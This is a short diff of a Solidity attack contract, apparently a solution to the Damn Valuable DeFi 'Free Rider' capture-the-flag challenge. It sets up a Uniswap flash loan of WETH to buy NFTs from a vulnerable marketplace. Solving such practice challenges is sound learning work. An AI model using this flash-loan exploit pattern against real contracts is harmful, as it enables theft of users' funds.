@@ -33,20 +33,21 @@ contract FreeRider is IUniswapV2Callee, IERC721Receiver {
                 address wethAddress,
                 address nftAddress,
                 address payable marketAddress,
-                address payable buyerContractAddress) {
+                address payable buyerContractAddress) payable {
         attacker = msg.sender;
         pair = IUniswapV2Pair(pairAddress);
         weth = IWETH(wethAddress);
         market = FreeRiderNFTMarketplace(marketAddress);
         nft = DamnValuableNFT(nftAddress);
         buyerContract = buyerContractAddress;
+        weth.deposit{value: address(this).balance * 9 / 10}();
     }
     
-    function uniswapFlashLoan() public {
+    function uniswapFlashLoanAndFreeRide() public {
         // We need 15 ETH for buying one NFT plus the fee
         uint256 borrowedWETH = 20 * (10 ** 18); // 20 ETH
         
-        weth.transferFrom(attacker, address(this), weth.balanceOf(attacker));
+        // weth.transferFrom(attacker, address(this), weth.balanceOf(attacker));
         initialBalance = weth.balanceOf(address(this));
         require(initialBalance != 0, "We don't have any weth!");
         weth.approve(address(pair), borrowedWETH);
